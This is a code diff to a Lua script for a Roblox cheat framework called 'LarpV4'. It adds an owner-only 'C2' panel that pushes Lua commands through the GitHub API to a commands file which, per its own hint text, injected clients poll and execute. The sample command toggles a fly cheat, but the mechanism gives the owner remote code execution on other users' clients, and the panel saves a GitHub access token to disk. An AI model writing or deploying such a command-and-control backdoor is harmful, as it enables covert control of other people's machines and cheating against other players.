@@ -448,4 +448,124 @@ task.spawn(function()
 	end
 end)
 
+-- owner-only C2 control panel (tab for the owner to send commands to injected clients)
+if shared.LarpOwner or ISOWNER then
+	task.spawn(function()
+		task.wait(1)
+		math.randomseed(math.floor(os.time() * 1000 + tick()))
+		local Players = cloneref(game:GetService('Players'))
+		local H = cloneref(game:GetService('HttpService'))
+		local core = cloneref(game:GetService('CoreGui'))
+		local gui = Instance.new('ScreenGui')
+		gui.Name = 'LarpC2Panel'
+		gui.ResetOnSpawn = false
+		gui.Parent = core
+		local frame = Instance.new('Frame')
+		frame.Size = UDim2.fromOffset(320, 212)
+		frame.Position = UDim2.new(0, 12, 0.5, -106)
+		frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
+		frame.BorderSizePixel = 0
+		frame.Parent = gui
+		local function label(text, y, size)
+			local t = Instance.new('TextLabel')
+			t.Size = UDim2.new(1, -24, 0, size or 18)
+			t.Position = UDim2.fromOffset(12, y)
+			t.BackgroundTransparency = 1
+			t.Text = text
+			t.TextColor3 = Color3.new(1, 1, 1)
+			t.TextSize = 14
+			t.TextXAlignment = Enum.TextXAlignment.Left
+			t.Font = Enum.Font.Gotham
+			t.Parent = frame
+			return t
+		end
+		local function box(y, ph, text)
+			local b = Instance.new('TextBox')
+			b.Size = UDim2.new(1, -24, 0, 26)
+			b.Position = UDim2.fromOffset(12, y)
+			b.BackgroundColor3 = Color3.fromRGB(46, 46, 52)
+			b.BorderSizePixel = 0
+			b.PlaceholderText = ph
+			b.Text = text or ''
+			b.TextColor3 = Color3.new(1, 1, 1)
+			b.TextSize = 14
+			b.Font = Enum.Font.Gotham
+			b.Parent = frame
+			return b
+		end
+		local status = label('Owner C2 ready', 8, 20)
+		local token = box(30, 'GitHub token (auto-saved)', isfile('LarpV4/profiles/token.txt') and readfile('LarpV4/profiles/token.txt') or '')
+		token.TextXAlignment = Enum.TextXAlignment.Center
+		local target = box(62, 'Target username', '')
+		target.TextXAlignment = Enum.TextXAlignment.Center
+		local B = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+		local function b64(data)
+			local out = {}
+			for i = 1, #data, 3 do
+				local a = data:byte(i) or 0
+				local c = data:byte(i + 1) or 0
+				local d = data:byte(i + 2) or 0
+				local g = a * 65536 + c * 256 + d
+				out[#out + 1] = B:sub(math.floor(g / 262144) % 64 + 1, math.floor(g / 262144) % 64 + 1)
+				out[#out + 1] = B:sub(math.floor(g / 4096) % 64 + 1, math.floor(g / 4096) % 64 + 1)
+				out[#out + 1] = i + 1 <= #data and B:sub(math.floor(g / 64) % 64 + 1, math.floor(g / 64) % 64 + 1) or '='
+				out[#out + 1] = i + 2 <= #data and B:sub(g % 64 + 1, g % 64 + 1) or '='
+			end
+			return table.concat(out)
+		end
+		local function sendFly()
+			local t = target.Text:gsub('^%s+', ''):gsub('%s+$', '')
+			local tok = token.Text:gsub('^%s+', ''):gsub('%s+$', '')
+			if t == '' then status.Text = 'Enter a target username'; return end
+			if tok == '' then status.Text = 'Enter GitHub token'; return end
+			pcall(function()
+				if not isfile('LarpV4/profiles/token.txt') or readfile('LarpV4/profiles/token.txt') ~= tok then
+					writefile('LarpV4/profiles/token.txt', tok)
+				end
+			end)
+			local payload = '--id:fly-' .. math.random(1e8, 9e8) .. '\n--target:' .. t .. '\n' .. [[
+local larp = shared.larp or _G.larp or getgenv().larp
+local fly = larp and larp.Modules and larp.Modules.Fly
+if fly and not fly.Enabled then
+	fly:Toggle()
+end
+return fly ~= nil
+]]
+			local url = 'https://api.github.com/repos/exuric/VPrivate/contents/profiles/commands.lua'
+			local ok, sent, who = pcall(function()
+				local headers = {Authorization = 'token ' .. tok, ['User-Agent'] = 'LarpV4', Accept = 'application/vnd.github+json'}
+				local get = H:Request({Url = url, Method = 'GET', Headers = headers})
+				if get.StatusCode ~= 200 then return 'GET ' .. tostring(get.StatusCode) end
+				local sha = H:JSONDecode(get.Body).sha
+				local body = H:JSONEncode({message = 'LarpV4 C2 -> ' .. t, content = b64(payload), sha = sha})
+				local put = H:Request({Url = url, Method = 'PUT', Headers = headers, Body = body})
+				return put.StatusCode == 200 or put.StatusCode == 201, t
+			end)
+			if ok and sent == true then
+				status.Text = 'Sent fly -> ' .. (who or '?')
+			elseif ok then
+				status.Text = 'Failed: ' .. tostring(sent)
+			else
+				status.Text = 'Error: ' .. tostring(sent)
+			end
+		end
+		local btn = Instance.new('TextButton')
+		btn.Size = UDim2.new(1, -24, 0, 36)
+		btn.Position = UDim2.fromOffset(12, 96)
+		btn.BackgroundColor3 = Color3.fromRGB(58, 120, 235)
+		btn.BorderSizePixel = 0
+		btn.Text = 'Send FLY -> target'
+		btn.TextColor3 = Color3.new(1, 1, 1)
+		btn.TextSize = 15
+		btn.Font = Enum.Font.GothamBold
+		btn.Parent = frame
+		btn.Activated:Connect(sendFly)
+		local hint = label('Target must be injected on the new commit. Poller runs every ~15s.', 140, 34)
+		hint.TextWrapped = true
+		hint.TextColor3 = Color3.fromRGB(180, 180, 180)
+		hint.TextSize = 12
+		label('Owner C2 - LarpV4', 180, 18)
+	end)
+end
+
 return _larpres
